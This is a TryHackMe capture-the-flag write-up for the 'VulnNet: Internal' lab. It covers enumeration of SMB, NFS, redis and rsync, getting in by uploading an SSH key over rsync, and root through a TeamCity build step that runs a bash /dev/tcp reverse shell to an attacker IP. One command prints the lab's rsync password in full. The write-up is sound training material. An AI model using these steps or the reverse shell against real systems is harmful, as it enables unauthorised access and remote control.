# Try Hack Me - VulnNet: Internal
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 120
# Vulnerabilities: Leaked credentials of redis/resync services, weak .ssh directory permissions, weak log permissions
# Phase 1 - Reconnaissance:

nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT      STATE    SERVICE

22/tcp    open     ssh

111/tcp   open     rpcbind

139/tcp   open     netbios-ssn

445/tcp   open     microsoft-ds

873/tcp   open     rsync

2049/tcp  open     nfs

6379/tcp  open     redis

9090/tcp  filtered zeus-admin

33471/tcp open     unknown

36655/tcp open     unknown

42511/tcp open     unknown

45349/tcp open     unknown

56405/tcp open     unknown


lets start enumerating with the samba shares.

```bash
smbclient -L //<target_ip> -N
```

        Sharename       Type      Comment
       
        ---------       ----      -------
        
        print$          Disk      Printer Drivers
        
        shares          Disk      VulnNet Business Shares
        
        IPC$            IPC       IPC Service (ip-10-80-174-137 server (Samba, Ubuntu))

so there is a share named as "share". lets access this share to get any leads.

```bash
smbclient //<target_ip>/shares -N
```
we find two directories named /temp and /data. in /temp we find a services.txt file which is our flag1. in the /data directory we find the data.txt file and the business-req.txt file. we use the get command to transfer all these files to our attacker machine.

```bash
get /temp/services.txt
get /data/data.txt
get /data/business-req.txt
```

now lets find out the contents of the data.txt and the business-req.txt. it seems like these files are some hints for finding the other flags. we see the sender talking about a DOCUMENT and some TRANSACTION.

let's enumerate the nfs server

```bash
showmount -e <target_ip>
```
we find a /opt/conf* export. lets mount it on our machine.

```bash
sudo mkdir /mnt/nfs_vulnnet:internal
```

```bash
sudo mount -t nfs <target_ip>:/opt/conf /mnt/nfs_vulnnet:internal -o nolock
```
now we will manually enumerate the export for some hints/credentials.

in the redis directory we find a redis.conf file. on viewing its contents and analyzing the clutter using DeepSeek, i found some credentials to the redis-cli interface. now we can access the redis-cli at the port 

```bash
redis-cli -h <target_ip> -p 6379 -a "<redis_password>"
```
now the commands used in this interface are different to that of the other interfaces. we use the following commands to enumerate the redis-cli

```bash
KEYS *
```
now we get the internal flag in this interface. 

```bash
GET "internal flag"
```
now we will try to find the range of the authlist

```bash
LLEN authlist
```
# Phase 2 - Initial Foothold:

there are 4 indices of the authlist, after checking all of the 4, the contents they have is the same. the content is encoded in base64. on decoding the contents using cyberchef, we can find the password to the rsync service.

```bash
LRANGE authlist 0
```

now lets find what directories are present on the rsync service.

```bash
RSYNC_PASSWORD=<rsync_password> rsync -av rsync://rsync-connect@<target_ip> --list-only
```
now we file that a module named "files" is present on the interface. lets enumerate the files module and find what is inside of it.

```bash
RSYNC_PASSWORD=<rsync_password> rsync -av rsync://rsync-connect@<target_ip>/files/
```
we can see there are a lot of files. but the most interesting one is the /.ssh directory. we can upload our personal ssh public keys on the system. lets generate some public keys using ssh-keygen

# Shell as sys-internal:

```bash
ssh-keygen -t rsa -f sys_id_rsa -N ""
```
lets give the private key the appropriate permissions
```bash
chmod 600 sys_id_rsa
```
now we will upload the public keys to the /.ssh/authorized_keys file.

```bash
RSYNC_PASSWORD=Hcg3HP67@TW@Bc72v rsync -av sys_id_rsa.pub rsync://rsync-connect@<target_ip>/files/sys-internal/.ssh/authorized_keys
```
now we have successfully uploaded the public id_rsa. now we will login using the private id_rsa. 

```bash
ssh -i sys_id_rsa sys-internal@<target_ip>
```
we find the user.txt flag in the /home/sys-internal directory. we read it and submit it. now after some manual enumeration we find nothing but an unusual folder at the root directory named /TeamCity. lets run linpeas.sh on the machine in order to find more information about it. after runnning the script, we found out that the TeamCity service is running on the port 8111 on localhost. we might be able to access it using ssh port forwarding. 

# Phase 3 - Privilege Escalation:

```bash
ssh -i sys_id_rsa -L 8111:localhost:8111 sys-internal@<target_ip>
```
now we can access the website at `http://localhost:8111` on visiting the website we find out a login page, we try multiple SQL injections but all of them fail. but wait, there is a super user login page as well.

turns out this requires a super user authentication token. previously in the /TeamCity directory, we found a /logs directory as well. lets navigate to that location in ordewr to find something useful. after about 10 minutes of manual enumeration, we finally find the super user token in the file `catalina.out`

```bash
cat /TeamCity/logs/catalina.out
```

`NOTE: Copy the latest super user authentication token, it probably starts with a '6'. make sure that you do not select the older super user tokens since they might be invalid`

![image1](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2000-19-54%20Log%20in%20to%20TeamCity%20%E2%80%94%20TeamCity.png)

now we have access to the super user dash board. lets try to upload a reverse shell on this page somehow. start by creating a project. name it anything. 

![image2](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2000-22-27%20Log%20in%20as%20Super%20user%20%E2%80%94%20TeamCity.png)

after that save the changes and then click on the build configuration option

![image3](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-00-03%20Create%20Project%20%E2%80%94%20TeamCity.png)

fill the details and save it. 

![image4](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-02-05%20Create%20Build%20Configuration%20%E2%80%94%20TeamCity.png)

afterwards you will see an option at the left hand side which says to build steps. we can probably inject a reverseshell here because this is the page where we add the actual content of the project.

![image5](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-03-14%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)

select the `Command line` option and then paste this reverseshell payload to the command interface
```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
```

![image6](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-27-26%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)


```bash
#setup a netcat listener in another terminal:
nc -lnvp 4444
```
now we will click on save, we can click on the `Run` button in order to trigger the shell.

annd just like that, we have solved one of the most difficult most exhausting Easy level ctf on TryHackMe. Kudos to the creator!
